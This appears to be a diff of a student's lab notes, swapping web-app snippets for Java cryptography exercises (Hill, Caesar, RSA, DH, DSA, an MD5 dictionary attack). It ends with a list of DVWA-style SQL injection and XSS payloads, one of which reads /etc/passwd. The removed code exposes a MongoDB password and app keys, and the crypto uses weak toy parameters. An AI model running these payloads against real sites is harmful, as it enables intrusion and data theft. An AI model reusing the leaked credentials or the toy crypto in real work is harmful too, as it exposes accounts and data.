@@ -1,333 +1,923 @@
-postman:
+import java.util.*;
+public class hill_cipher {
+
+    public static void main(String[] args) {
+        Scanner in = new Scanner(System.in);
+        System.out.println("Enter plaintext:");
+        String plaint =in.nextLine();
+
+        System.out.println("Enter key marix size nxn:");
+        int n = in.nextInt();
+        int key[][] = new int[n][n];
+        System.out.println("Enter values in key matrix:");
+        getkeymatrix(n,key);
+
+        int[][] pt = new int[n][n];
+        int k=0;
+        for(int j =0;j<n;j++){
+            for(int i=0;i<n;i++){
+                pt[i][j] = plaint.charAt(k)-'A';
+                k++;
+            }
+
+        }
+        System.out.println("corresponding plain text : ");
+
+        for(int i =0;i<n;i++){
+            for(int j=0;j<n;j++){
+                System.out.print(pt[i][j]+" ");
+            }
+            System.out.println();
+        }
+
+        int[][] ciphert = new int[n][n];
+        int[][] newpt = new int[n][n];
+        encrypt(ciphert,pt,key,n);
+
+        decrypt(ciphert,newpt,key,n);
 
-const express = require('express');
-const bodyParser = require('body-parser');
 
-const app = express();
-const PORT = 3000;
-
-// Middleware to parse request body
-app.use(bodyParser.json());
-
-// Sample data for CRUD operations
-let users = [
-  { id: 1, name: 'John Doe', email: 'john@example.com' },
-  { id: 2, name: 'Jane Smith', email: 'jane@example.com' }
-];
-
-// CREATE: Add a new user
-app.post('/users', (req, res) => {
-  const newUser = {
-    id: users.length + 1,
-    name: req.body.name,
-    email: req.body.email
-  };
-  users.push(newUser);
-  res.status(201).json(newUser);
-});
-
-// READ: Get all users
-app.get('/users', (req, res) => {
-  res.json(users);
-});
-
-// READ: Get a user by ID
-app.get('/users/:id', (req, res) => {
-  const user = users.find(u => u.id === parseInt(req.params.id));
-  if (!user) return res.status(404).json({ message: 'User not found' });
-  res.json(user);
-});
-
-// UPDATE: Update a user's information
-app.put('/users/:id', (req, res) => {
-  const user = users.find(u => u.id === parseInt(req.params.id));
-  if (!user) return res.status(404).json({ message: 'User not found' });
-
-  user.name = req.body.name || user.name;
-  user.email = req.body.email || user.email;
-  res.json(user);
-});
-
-// DELETE: Remove a user
-app.delete('/users/:id', (req, res) => {
-  users = users.filter(u => u.id !== parseInt(req.params.id));
-  res.json({ message: 'User deleted successfully' });
-});
-
-// Start server
-app.listen(PORT, () => {
-  console.log(Server running on port ${PORT});
-});
-
-
-
-
-dropbox:
-
-import logo from './logo.svg';
-import './App.css';
-import DropboxChooser from 'react-dropbox-chooser';
-import {useState} from 'react'
-
-function App() {
-  const [url,seturl]=useState("")
-  return (
-    <div className="App">
-     <h1>upload file</h1>
-     <DropboxChooser 
-        appKey='ncye2b2etfl1mzz' 
-        success={file=>seturl(file[0].thumbnailLink)}
-        cancel={file=>console.log(file)}
-        multiselect={true}
-      ></DropboxChooser>
-      <img src={url} alt='no image' width={200}></img>
-    </div>
-  );
-}
-
-export default App;
-
-
-
-
-
-
-
-
-third party api:
-
-
-import React, { useState, useEffect } from "react";
-import axios from "axios";
-
-function App() {
-  const [todo, setTodo] = useState(null);
-  const [loading, setLoading] = useState(true);
-
-  useEffect(() => {
-    axios
-      .get("https://jsonplaceholder.typicode.com/todos/1")
-      .then((response) => {
-        setTodo(response.data);
-        setLoading(false);
-      })
-      .catch((error) => {
-        console.error("Error fetching data:", error);
-        setLoading(false);
-      });
-  }, []);
-
-  if (loading) {
-    return <div>Loading...</div>;
-  }
-
-  return (
-    <div>
-      <h1>Todo Details</h1>
-      {todo && (
-        <div>
-          <p>ID: {todo.id}</p>
-          <p>Title: {todo.title}</p>
-        </div>
-      )}
-    </div>
-  );
-}
-
-export default App;
-
-
-
-
-
-
-
-
-
-firebase:
-
-import logo from './logo.svg';
-import './App.css';
-import {useEffect,useState} from 'react'
-import { initializeApp } from "firebase/app";
-import { getAnalytics,logEvent } from "firebase/analytics";
-import {getAuth,signInWithEmailAndPassword} from 'firebase/auth'
-function App() {
-  const firebaseConfig = {
-    apiKey: "AIzaSyDZj1iZ14x9NiSyyrxUR1GYeNDqmruTIJE",
-    authDomain: "vvvvm-deffc.firebaseapp.com",
-    projectId: "vvvvm-deffc",
-    storageBucket: "vvvvm-deffc.firebasestorage.app",
-    messagingSenderId: "441975377097",
-    appId: "1:441975377097:web:cf76d08bdf574ed4ead118",
-    measurementId: "G-0QCJSSSF2Q"
-  };
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-  const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
-const auth=getAuth(app)
-useEffect(()=>{
-  logEvent(analytics,'thiru')
-},[])
-const handleLogin = async (e) => {
-  // e.preventDefault();
-  try {
-    await signInWithEmailAndPassword(auth,email,password)
-    alert("login successfull")
-  }
-  catch(e){
-    alert(e)
-  }
-}
-  return (
-    <div className="App">
-     
-      <input type="email" value={email} onChange={(e)=>setEmail(e.target.value)}></input>
-      <input type="password" value={password} onChange={(e)=>setPassword(e.target.value)}></input>
-      <button onClick={handleLogin}>Login</button>
-     
-    </div>
-  );
-}
-
-export default App;
-
-
-
-
-
-
-
-
-
-db
-
-
-import './App.css';
-import axios from 'axios';
-import { useEffect, useState } from 'react';
-
-function App() {
-  const [data, setData] = useState([]);
-  const [name, setName] = useState('');
-  const [price, setPrice] = useState('');
-  const [id, setId] = useState(null);
-
-  // Fetch products on component mount
-  useEffect(() => {
-    axios.get('http://localhost:5000/products').then(res => {
-      setData(res.data);
-    }).catch(err => console.error(err));
-  }, []);
-
-  // Function to re-fetch data
-  const get = () => {
-    axios.get('http://localhost:5000/products').then(res => {
-      setData(res.data);
-    }).catch(err => console.error(err));
-  };
-
-  // Delete a product by id
-  const del = (id) => {
-    axios.delete(`http://localhost:5000/products/${id}`).then(() => {
-      get(); // Refresh product list after deletion
-    }).catch(err => console.error(err));
-  };
-
-  // Add a new product
-  const post = (e) => {
-    e.preventDefault(); 
-    axios.post('http://localhost:5000/products', { name, price }).then(() => {
-      setName(''); // Clear name field
-      setPrice(''); // Clear price field
-      get(); // Refresh product list after adding
-    }).catch(err => console.error(err));
-  };
-const edit=(ename,eprice,eid)=>{
-  setName(ename)
-  setPrice(eprice)
-  setId(eid)
-}
-const put = () => {
-  axios.put(`http://localhost:5000/products/${id}`, { name, price }).then(() => {
-    get(); 
-    setName(''); // Clear name field
-    setPrice('');
-    setId(null);
-    
-  }).catch(err => console.error(err));
-};
-  return (
-    <div className="App">
-      <form>
-        <input
-          type='text'
-          value={name}
-          placeholder="Product Name"
-          onChange={(e) => setName(e.target.value)} // Fix "target" reference
-        />
-        <input
-          type='number'
-          value={price}
-          placeholder="Product Price"
-          onChange={(e) => setPrice(e.target.value)} // Fix "target" reference
-        />
-        {id?(
-        <button onClick={put}>update</button>):(<button onClick={post}>Add Product</button>)}
-      </form>
-
-      <ol>
-        {data.map(item => (
-          <li key={item._id}>
-            {item.name}: {item.price}
-            <button onClick={()=> edit(item.name,item.price,item._id)}>edit</button>
-            <button onClick={() => del(item._id)}>delete</button>
-          </li>
-        ))}
-      </ol>
-    </div>
-  );
-}
-
-export default App;
-
-
-
-
-server.js
-
-const express=require('express')
-const mongoose=require('mongoose')
-const cors=require('cors')
-const app=express()
-app.use(cors())
-app.use(express.json())
-const uri='mongodb+srv://sarveshwaranv:123@cluster0.9e43j.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
-mongoose.connect(uri).then(()=>{
-    console.log("connected to  mongo")
-})
-const Student=mongoose.model('students',new mongoose.Schema(
-    {
-        name:String,
-        age:Number
     }
-))
-app.post('/student',(req,res)=>{
-    const s=new Student(req.body)
-    s.save()
-    res.json("hi")
-})
-app.get('/student',async(req,res)=>{
-   
-    res.json(await Student.find())
-})
-app.put("/student/:id",(req,res)=>{
-    Student.findByIdAndUpdate(req.params.id,req.body,{new:true}).then((u)=>res.json(u))
-})
-app.delete("/student/:id",(req,res)=>{
-    Student.findByIdAndDelete(req.params.id).then((u)=>res.json(u))
-})
-app.listen(5000,()=>{
-    console.log("connected and started")
-})
+
+    static void decrypt(int[][] ct,int[][] npt,int[][] key,int n){
+
+        int kinv[][] ;
+
+        kinv = keyinverse(key,26);
+        System.out.println("Key inverse matrix : ");
+
+        for(int i =0;i<n;i++){
+            for(int j=0;j<n;j++){
+                System.out.print(kinv[i][j]+" ");
+            }
+            System.out.println();
+        }
+
+
+
+
+        for (int i =0;i<n;i++){
+            for (int j=0;j<n;j++){
+                int sum=0;
+                for(int k =0;k<n;k++){
+                    sum+=(kinv[i][k]*ct[k][j]);
+                }
+                npt[i][j] = sum%26;
+            }
+        }
+
+        System.out.println("plain text after decryption  : ");
+
+        for(int i =0;i<n;i++){
+            for(int j=0;j<n;j++){
+                System.out.print(npt[i][j]+" ");
+            }
+            System.out.println();
+        }
+
+        System.out.println();
+        for(int j =0;j<n;j++){
+            for(int i=0;i<n;i++){
+                System.out.print((char)(npt[i][j]+65)+"");
+            }
+
+        }
+
+
+
+
+    }
+    static void getCofactor(int[][] matrix, int[][] temp, int p, int q, int n) {
+        int i = 0, j = 0;
+
+        for (int row = 0; row < n; row++) {
+            for (int col = 0; col < n; col++) {
+                if (row != p && col != q) {
+                    temp[i][j++] = matrix[row][col];
+                    if (j == n - 1) {
+                        j = 0;
+                        i++;
+                    }
+                }
+            }
+        }
+    }
+
+    // Function to calculate the determinant of the matrix
+    static int determinant(int[][] matrix, int n) {
+        int det = 0;
+        if (n == 1)
+            return matrix[0][0];
+
+        int[][] temp = new int[n][n];
+        int sign = 1;
+
+        for (int f = 0; f < n; f++) {
+            getCofactor(matrix, temp, 0, f, n);
+            det += sign * matrix[0][f] * determinant(temp, n - 1);
+            det = ((det % 26) + 26) % 26;
+            sign = -sign;
+        }
+
+        return det;
+    }
+
+    // Function to find the modular inverse of a under modulo m
+    static int modInverse(int a, int m) {
+        a = a % m;
+        for (int x = 1; x < m; x++) {
+            if ((a * x) % m == 1) {
+                return x;
+            }
+        }
+        return -1; // In case the inverse does not exist
+    }
+
+    // Function to get the adjoint of the matrix
+    static void adjoint(int[][] matrix, int[][] adjoint) {
+        int n = matrix.length;
+        if (n == 1) {
+            adjoint[0][0] = 1;
+            return;
+        }
+
+        int sign;
+        int[][] temp = new int[n][n];
+
+        for (int i = 0; i < n; i++) {
+            for (int j = 0; j < n; j++) {
+                getCofactor(matrix, temp, i, j, n);
+                sign = ((i + j) % 2 == 0) ? 1 : -1;
+                adjoint[j][i] = (sign * determinant(temp, n - 1)) % 26;
+                adjoint[j][i] = ((adjoint[j][i] % 26) + 26) % 26;
+            }
+        }
+    }
+
+    // Function to invert the matrix modulo 26
+    static int[][] keyinverse(int[][] matrix, int mod) {
+        int n = matrix.length;
+        int det = determinant(matrix, n);
+        int detInv = modInverse(det, mod);
+
+        if (detInv == -1) {
+            return null; // Matrix is not invertible
+        }
+
+        int[][] adj = new int[n][n];
+        adjoint(matrix, adj);
+
+        int[][] inverse = new int[n][n];
+        for (int i = 0; i < n; i++) {
+            for (int j = 0; j < n; j++) {
+                inverse[i][j] = (adj[i][j] * detInv) % mod;
+                inverse[i][j] = (inverse[i][j] + mod) % mod; // Ensure non-negative
+            }
+        }
+
+        return inverse;
+    }
+    static  void encrypt(int[][] ct,int[][] pt,int[][] key,int n){
+
+        for (int i =0;i<n;i++){
+            for (int j=0;j<n;j++){
+                int sum=0;
+                for(int k =0;k<n;k++){
+                     sum+=(key[i][k]*pt[k][j]);
+                }
+                ct[i][j] = sum%26;
+            }
+        }
+
+        System.out.println("corresponding ciphertext : ");
+
+        for (int i =0;i<n;i++){
+            for (int j=0;j<n;j++){
+                System.out.print(ct[i][j]+" ");
+            }
+            System.out.println();
+        }
+    }
+
+    static void getkeymatrix(int n,int[][] key){
+        Scanner in = new Scanner(System.in);
+        for(int i=0;i<n;i++){
+            for(int j=0;j<n;j++){
+                key[i][j] = in.nextInt();
+            }
+            System.out.println();
+        }
+    }
+}
+
+
+
+
+
+
+
+
+
+import java.io.*;
+import java.net.*;
+import java.util.Scanner;
+
+public class cclient{
+    public static void main(String[] args) throws Exception{
+        Socket cs = new Socket("localhost",8080);
+        BufferedReader infserver=new BufferedReader(new InputStreamReader(cs.getInputStream()));
+        Scanner in=new Scanner(System.in);
+        PrintWriter infts=new PrintWriter(cs.getOutputStream(),true);
+        System.out.println("Enter msg:");
+        String msg=in.nextLine();
+        infts.println(encrypt(msg, 3));
+
+    }
+    static String encrypt(String pt,int key){
+        StringBuilder et=new StringBuilder();
+        key=key%26;
+        if (key<0){
+            key+=26;
+        }
+        for(int i=0;i<pt.length();i++){
+            char ch=pt.charAt(i);
+            if(Character.isLetter(ch)){
+                char base=Character.isLowerCase(ch)?'a':'A';
+                char e=(char)((ch+key-base)%26+base);
+                et.append(e);
+            }
+            else{
+                et.append(ch);
+            }
+        }
+        return et.toString();
+    }
+}
+
+
+
+
+
+
+
+
+
+import java.io.*;
+import java.net.*;
+import java.util.Scanner;
+
+public class cserver{
+    public static void main(String[] args) throws Exception{
+        ServerSocket ss=new ServerSocket(8080);
+        Socket cs = ss.accept();
+        BufferedReader infclient=new BufferedReader(new InputStreamReader(cs.getInputStream()));
+        Scanner in=new Scanner(System.in);
+        PrintWriter inftc=new PrintWriter(cs.getOutputStream(),true);
+        String msg=infclient.readLine();
+        System.out.println(encrypt(msg, -3));
+    }
+    static String encrypt(String pt,int key){
+        StringBuilder et=new StringBuilder();
+        key=key%26;
+        if (key<0){
+            key+=26;
+        }
+        for(int i=0;i<pt.length();i++){
+            char ch=pt.charAt(i);
+            if(Character.isLetter(ch)){
+                char base=Character.isLowerCase(ch)?'a':'A';
+                char e=(char)((ch+key-base)%26+base);
+                et.append(e);
+            }
+            else{
+                et.append(ch);
+            }
+        }
+        return et.toString();
+    }
+}
+
+
+
+
+
+
+
+
+
+import java.math.BigInteger;
+import java.security.SecureRandom;
+
+
+public class rsa{
+    public static void main(String[] args){
+        String msg="Hi da kena punda";
+        Keypair kp=keygen();
+        BigInteger e=kp.e;
+        BigInteger d=kp.d;
+        BigInteger n=kp.n;
+
+        BigInteger pt=new BigInteger(msg.getBytes());
+        BigInteger enc=encrypt(pt,e,n);
+        System.out.println("Enc:"+enc);
+        BigInteger dec=decrypt(enc,d,n);
+        System.out.println("Dec:"+new String(dec.toByteArray()));
+    }
+
+    static BigInteger encrypt(BigInteger pt, BigInteger e, BigInteger n){
+        return pt.modPow(e, n);
+    }
+
+    static BigInteger decrypt(BigInteger pt, BigInteger d, BigInteger n){
+        return pt.modPow(d, n);
+    }
+
+    static Keypair keygen(){
+        SecureRandom r=new SecureRandom();
+        BigInteger p=BigInteger.probablePrime(64, r);
+        BigInteger q=BigInteger.probablePrime(64, r);
+        BigInteger n=p.multiply(q);
+        BigInteger pi=(p.subtract(BigInteger.ONE)).multiply(q.subtract(BigInteger.ONE));
+        BigInteger e=BigInteger.probablePrime(64,r);
+        while(e.compareTo(BigInteger.ONE)<=0 || !pi.gcd(e).equals(BigInteger.ONE)){
+            e=e.add(BigInteger.ONE);
+        }
+        BigInteger d = e.modInverse(pi);
+        return new Keypair(n,e,d);
+    }
+}
+
+class Keypair{
+    public final BigInteger e;
+    public final BigInteger d;
+    public final BigInteger n;
+    public Keypair(BigInteger n, BigInteger e, BigInteger d){
+        this.e=e;
+        this.n=n;
+        this.d=d;
+    }
+}
+
+
+
+
+
+
+
+import java.util.*;
+import java.security.*;
+import java.io.*;
+public class dict {
+    public static void main(String[] args) {
+        Scanner sc=new Scanner(System.in);
+        String pass=sc.nextLine();
+        try{
+        Scanner file=new Scanner(new File("pass.txt"));
+        while(file.hasNextLine()){
+            String has=file.nextLine();
+            has=hash(has);
+            if(pass.equals(has)){
+                System.out.println("password found ");
+                return;
+            }
+            System.out.println("no password");
+            System.out.println(has);
+        }
+    }catch(Exception e){}
+}
+    public static String hash(String p) {
+        try{
+        MessageDigest md=MessageDigest.getInstance("MD5");
+        byte[] hashbyte=md.digest(p.getBytes());
+        StringBuilder sb=new StringBuilder();
+        for(byte b:hashbyte){
+            sb.append(String.format("%02x",b));
+        }
+        return sb.toString();
+        }
+        catch(NoSuchAlgorithmException e){}
+        return null;
+    }
+}
+
+
+import java.util.*;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+
+public class Dict {
+    private static Map<String, String> passwordTable = new HashMap<>();
+    private static List<String> dictionary = new ArrayList<>();
+
+    public static void main(String[] args) {
+        Scanner scanner = new Scanner(System.in);
+        int choice;
+        do {
+            System.out.println("Menu:");
+            System.out.println("1. Create Dictionary");
+            System.out.println("2. Create Password Table");
+            System.out.println("3. Display Password Table");
+            System.out.println("4. Launch Dictionary Attack");
+            System.out.println("5. Exit");
+            System.out.print("Enter your choice: ");
+            choice = scanner.nextInt();
+            scanner.nextLine(); // Consume newline
+
+            switch (choice) {
+                case 1:
+                    createDictionary(scanner);
+                    break;
+                case 2:
+                    createPasswordTable(scanner);
+                    break;
+                case 3:
+                    displayPasswordTable();
+                    break;
+                case 4:
+                    launchDictionaryAttack(scanner);
+                    break;
+                case 5:
+                    System.out.println("Exiting...");
+                    break;
+                default:
+                    System.out.println("Invalid choice. Please try again.");
+            }
+        } while (choice != 5);
+        scanner.close();
+    }
+
+    private static void createDictionary(Scanner scanner) {
+        System.out.print("Enter 'alphabets' or 'numerals': ");
+        String type = scanner.nextLine().toLowerCase();
+        System.out.print("Enter the length: ");
+        int length = scanner.nextInt();
+        scanner.nextLine(); // Consume newline
+
+        dictionary.clear();
+        generateDictionaryEntries(type, length, "");
+
+        System.out.println("Dictionary created with " + dictionary.size() + " entries.");
+    }
+
+    private static void generateDictionaryEntries(String type, int length, String prefix) {
+        if (length == 0) {
+            dictionary.add(prefix);
+            return;
+        }
+        char start = (type.equals("alphabets")) ? 'a' : '0';
+        char end = (type.equals("alphabets")) ? 'z' : '9';
+        for (char c = start; c <= end; c++) {
+            generateDictionaryEntries(type, length - 1, prefix + c);
+        }
+    }
+
+    private static void createPasswordTable(Scanner scanner) {
+        System.out.print("Enter username: ");
+        String username = scanner.nextLine();
+        System.out.print("Enter password: ");
+        String password = scanner.nextLine();
+
+        passwordTable.put(username, hashMD5(password));
+        System.out.println("Password table updated.");
+    }
+
+    private static void displayPasswordTable() {
+        System.out.println("Password Table (MD5 Hashed):");
+        for (Map.Entry<String, String> entry : passwordTable.entrySet()) {
+            System.out.println("Username: " + entry.getKey() + ", Password: " + entry.getValue());
+        }
+    }
+
+    private static void launchDictionaryAttack(Scanner scanner) {
+        System.out.print("Enter username: ");
+        String username = scanner.nextLine();
+
+        if (!passwordTable.containsKey(username)) {
+            System.out.println("Username not found.");
+            return;
+        }
+
+        String hashedPassword = passwordTable.get(username);
+        for (String entry : dictionary) {
+            if (hashMD5(entry).equals(hashedPassword)) {
+                System.out.println("Password found for username '" + username + "': " + entry);
+                return;
+            }
+        }
+        System.out.println("Password not found in dictionary.");
+    }
+
+    private static String hashMD5(String input) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("MD5");
+            byte[] messageDigest = md.digest(input.getBytes());
+            StringBuilder sb = new StringBuilder();
+            for (byte b : messageDigest) {
+                sb.append(String.format("%02x", b));
+            }
+            return sb.toString();
+        } catch (NoSuchAlgorithmException e) {
+            throw new RuntimeException(e);
+        }
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+import java.util.Scanner;
+
+public class SHA {
+
+    public static int rotateLeft(int value, int bits) {
+        return (value << bits) | (value >>> (32 - bits));
+    }
+
+    public static void sha1Step(int a, int b, int c, int d, int e, int w) {
+
+        int f;
+        int k;
+
+        f = (b & c) | (~b & d);
+        k = 0x5A827999;
+
+
+        int temp = rotateLeft(a, 5) + f + e + k + w;
+        e = d;
+        d = c;
+        c = rotateLeft(b, 30);
+        b = a;
+        a = temp;
+
+        System.out.println("Updated values:");
+        System.out.println("a: " + String.format("%02x", a));
+        System.out.println("b: " + String.format("%02x", b));
+        System.out.println("c: " + String.format("%02x", c));
+        System.out.println("d: " + String.format("%02x", d));
+        System.out.println("e: " + String.format("%02x", e));
+    }
+
+    public static void main(String[] args) {
+        Scanner scanner = new Scanner(System.in);
+
+        System.out.print("Enter value for w (hex): ");
+        int w = (int)Long.parseLong(scanner.nextLine(), 16);
+
+        System.out.print("Enter value for a (hex): ");
+        int a = (int)Long.parseLong(scanner.nextLine(), 16);
+
+        System.out.print("Enter value for b (hex): ");
+        int b = (int)Long.parseLong(scanner.nextLine(), 16);
+
+        System.out.print("Enter value for c (hex): ");
+        int c = (int)Long.parseLong(scanner.nextLine(), 16);
+
+        System.out.print("Enter value for d (hex): ");
+        int d =(int)Long.parseLong(scanner.nextLine(), 16);
+
+        System.out.print("Enter value for e (hex): ");
+        int e = (int)Long.parseLong(scanner.nextLine(), 16);
+
+        
+        sha1Step(a, b, c, d, e, w);
+
+        scanner.close();
+    }
+}
+
+
+
+
+
+
+
+
+
+import java.io.*;
+import java.math.BigInteger;
+import java.net.*;
+import java.security.SecureRandom;
+
+public class DHClient {
+
+
+    public static void main(String[] args) throws Exception {
+        Socket cs = new Socket("localhost", 8080);
+        PrintWriter out = new PrintWriter(cs.getOutputStream(), true);
+        BufferedReader in = new BufferedReader(new InputStreamReader(cs.getInputStream()));
+
+        BigInteger P = new BigInteger(in.readLine());
+        BigInteger G = new BigInteger(in.readLine());
+        BigInteger sPuk = new BigInteger(in.readLine());
+
+        System.out.println("Large Prime : "+P);
+        System.out.println("Generator : "+G);
+
+        SecureRandom r = new SecureRandom();
+        BigInteger cPrk = new BigInteger(15, r);
+        BigInteger cPuk = G.modPow(cPrk, P);
+
+            out.println(cPuk.toString());
+
+            BigInteger sharedSecret = sPuk.modPow(cPrk, P);
+
+            System.out.println("Client's public key: " + cPuk);
+            System.out.println("Server's public key: " + sPuk);
+            System.out.println("Shared secret: " + sharedSecret);
+
+    }
+}
+
+
+
+import java.io.*;
+import java.math.BigInteger;
+import java.net.*;
+import java.security.SecureRandom;
+
+public class DHServer {
+
+    public static void main(String[] args) throws Exception{
+             ServerSocket ss = new ServerSocket(8080);
+             Socket cs = ss.accept();
+             BufferedReader in = new BufferedReader(new InputStreamReader(cs.getInputStream()));
+             PrintWriter out = new PrintWriter(cs.getOutputStream(), true);
+
+            SecureRandom r = new SecureRandom();
+            BigInteger p = BigInteger.probablePrime(16, r);
+            BigInteger g = findSmallestGenerator(p);
+
+            BigInteger sPrk = new BigInteger(15, r);
+            BigInteger sPuk = g.modPow(sPrk, p);
+
+            out.println(p.toString());
+            out.println(g.toString());
+            out.println(sPuk.toString());
+            System.out.println("public key send to client:"+sPuk);
+
+            BigInteger cPuk = new BigInteger(in.readLine());
+            BigInteger sharedSecret = cPuk.modPow(sPrk, p);
+            System.out.println("public key received from client:"+cPuk);
+            System.out.println("Shared secret: " + sharedSecret);
+
+        }
+
+
+    private static BigInteger findSmallestGenerator(BigInteger p) {
+        for (BigInteger g = BigInteger.TWO; g.compareTo(p) < 0; g = g.add(BigInteger.ONE)) {
+            if (isGenerator(g, p)) {
+                return g;
+            }
+        }
+        return BigInteger.ZERO;
+    }
+
+    private static boolean isGenerator(BigInteger g, BigInteger p) {
+        boolean[] residues = new boolean[p.intValue()];
+        BigInteger value = BigInteger.ONE;
+        for (int i = 0; i < p.intValue() - 1; i++) {
+            value = value.multiply(g).mod(p);
+            if (residues[value.intValue()]) return false;
+            residues[value.intValue()] = true;
+        }
+        return true;
+    }
+}
+
+
+
+
+
+import java.util.*;
+
+public class FrequencyAnalysis {
+
+    private static final String ALPHABET = "abcdefghijklmnopqrstuvwxyz";
+    private static final String FREQUENCY_ORDER = "etaoinshrdlcumwfgypbvkjxqz"; 
+
+    public static void main(String[] args) {
+        Scanner scanner = new Scanner(System.in);
+        System.out.print("Enter the Cipher Text: ");
+        String ciphertext = scanner.nextLine();
+        ciphertext = ciphertext.toLowerCase();
+        frequencyAnalysis(ciphertext);
+        System.out.println("Thirumalai_22IT120");
+    }
+
+    public static void frequencyAnalysis(String text) {
+        Map<Character, Integer> frequencyMap = new HashMap<>();
+        for (char c : text.toCharArray()) {
+            if (Character.isLetter(c)) {
+                frequencyMap.put(c, frequencyMap.getOrDefault(c, 0) + 1);
+            }
+        }
+
+        System.out.println("Character Frequencies:");
+        for (Map.Entry<Character, Integer> entry : frequencyMap.entrySet()) {
+            System.out.println(entry.getKey() + ": " + entry.getValue());
+        }
+
+        
+        char mostFrequentChar = Collections.max(frequencyMap.entrySet(), Map.Entry.comparingByValue()).getKey();
+
+        System.out.println("Possible Decryptions:");
+        Scanner s = new Scanner(System.in);
+        for (char frequentChar : FREQUENCY_ORDER.toCharArray()) {
+            int shift = mostFrequentChar - frequentChar;
+            System.err.println("Trying key value: " + shift);
+            System.out.println(decryptUsingShift(text, shift));
+            System.err.println("Is that correct (y/n)?");
+            char in = s.next().charAt(0);
+            if (in == 'y') {
+                return;
+            }
+        }
+    }
+
+    public static String decryptUsingShift(String cipherText, int shiftKey) {
+        final String ALPHABET = "abcdefghijklmnopqrstuvwxyz";
+        cipherText = cipherText.toLowerCase();
+        StringBuilder plainText = new StringBuilder();
+
+        for (int i = 0; i < cipherText.length(); i++) {
+            char currentChar = cipherText.charAt(i);
+            if (currentChar == ' ') {
+                plainText.append(' ');
+            } else if (Character.isLetter(currentChar)) {
+                int charPosition = ALPHABET.indexOf(currentChar);
+                int keyVal = (charPosition - shiftKey) % 26;
+                if (keyVal < 0) {
+                    keyVal = ALPHABET.length() + keyVal;
+                }
+                char replaceVal = ALPHABET.charAt(keyVal);
+                plainText.append(replaceVal);
+            } else {
+                plainText.append(currentChar);
+            }
+        }
+
+        return plainText.toString();
+    }
+}
+
+
+
+
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.SecureRandom;
+import java.util.Scanner;
+
+public class DSS {
+
+    private static BigInteger p, q, g, x, y, k, r, s;
+    private static SecureRandom random = new SecureRandom();
+
+    public static void computeGenerator() {
+        BigInteger h;
+        do {
+            h = new BigInteger(q.bitLength(), random);
+        } while (h.compareTo(BigInteger.ONE) <= 0 || h.compareTo(p.subtract(BigInteger.ONE)) >= 0);
+
+        g = h.modPow(p.subtract(BigInteger.ONE).divide(q), p); // g = h^((p-1)/q) mod p
+    }
+
+    // Generate parameters for DSA
+    public static void generateParameters() {
+        Scanner sc = new Scanner(System.in);
+
+        System.out.println("Enter prime p: ");
+        p = new BigInteger(sc.nextLine());
+
+        System.out.println("Enter prime q (divisor of p-1): ");
+        q = new BigInteger(sc.nextLine());
+
+        // Compute g based on p and q
+        computeGenerator();
+
+        // Generate private key x and public key y
+        x = new BigInteger(q.bitLength(), random).mod(q); // Private key x < q
+        y = g.modPow(x, p);  // Public key y = g^x mod p
+
+        System.out.println("Generated parameters:");
+        System.out.println("p = " + p);
+        System.out.println("q = " + q);
+        System.out.println("g = " + g);
+        System.out.println("Private key x: " + x);
+        System.out.println("Public key y: " + y);
+    }
+
+    // Hash function to hash the message using SHA-1
+    public static BigInteger hashMessage(String message) throws Exception {
+        MessageDigest md = MessageDigest.getInstance("SHA-1");
+        byte[] messageDigest = md.digest(message.getBytes());
+        return new BigInteger(1, messageDigest).mod(q);  // Mod q to fit DSA range
+    }
+
+    // Signing the message
+    public static void sign(String message) throws Exception {
+        BigInteger hashedMessage = hashMessage(message);
+
+        do {
+            k = new BigInteger(q.bitLength(), random).mod(q);  // k must be < q
+        } while (k.equals(BigInteger.ZERO));
+
+        r = g.modPow(k, p).mod(q);  // r = (g^k mod p) mod q
+        s = (k.modInverse(q).multiply(hashedMessage.add(x.multiply(r)))).mod(q);  // s = k^-1 * (hash + x * r) mod q
+
+        System.out.println("\nSignature (r, s):");
+        System.out.println("r = " + r);
+        System.out.println("s = " + s);
+    }
+
+    // Verifying the signature
+    public static void verify(String message) throws Exception {
+        BigInteger hashedMessage = hashMessage(message);
+
+        BigInteger w = s.modInverse(q);  // w = s^-1 mod q
+        BigInteger u1 = (hashedMessage.multiply(w)).mod(q);  // u1 = hash * w mod q
+        BigInteger u2 = (r.multiply(w)).mod(q);  // u2 = r * w mod q
+        BigInteger v = ((g.modPow(u1, p).multiply(y.modPow(u2, p))).mod(p)).mod(q);  // v = (g^u1 * y^u2 mod p) mod q
+
+        System.out.println("\nComputed values:");
+        System.out.println("w = " + w);
+        System.out.println("u1 = " + u1);
+        System.out.println("u2 = " + u2);
+        System.out.println("v = " + v);
+
+        if (v.equals(r)) {
+            System.out.println("\nValid signature");
+        } else {
+            System.out.println("\nInvalid signature");
+        }
+    }
+
+    public static void main(String[] args) {
+        try {
+            generateParameters();
+
+            Scanner scanner = new Scanner(System.in);
+            System.out.print("\nEnter the message: ");
+            String message = scanner.nextLine();
+
+            sign(message); 
+            verify(message);  
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+
+
+
+LOW:
+1 = check expected result
+' or '1'='1 = check the results of an OR true statement
+1' ORDER BY 1;# = number of columns in the table
+' union select null,@@hostname# = hostname
+' union select load_file('/etc/passwd'),null# = display file
+
+MEDIUM:
+1 or 1=1 union select null, table_name from information_schema.tables# = all schema names
+1 union select null,@@version# = sql version
+
+XSS(Reflected):(LOW)
+Jalal<script>alert(100)</script>
+
+XSS(Reflected):(MEDIUM)
+Jalal<SCRIPT>alert(100)</script>
+
+XSS(DOM):(LOW)
+<script>alert(document.cookie)</script>
+
+XSS(DOM):(MEDIUM)
+</select><img src/alert(100)>
+</select><img src/onerror=alert(100)>
+.........................
+OPENSSL
+
+
+openssl aes-128-cbc -e -in plain.txt -out cipher.bin -k "password" -pbkdf2 -nosalt
+openssl aes-128-cbc -d -in cipher.bin -out pt.txt -k "password" -pbkdf2 –nosalt
+certutil -encodehex inputfile ouputfile
+openssl genrsa –out pvtkey.pem ---------gen pvt key
+openssl rsa -pubout -in pvtkey.pem -out pubkey.pem-----------gen pub key
+openssl rsa -text -in pvtkey.pem---------display
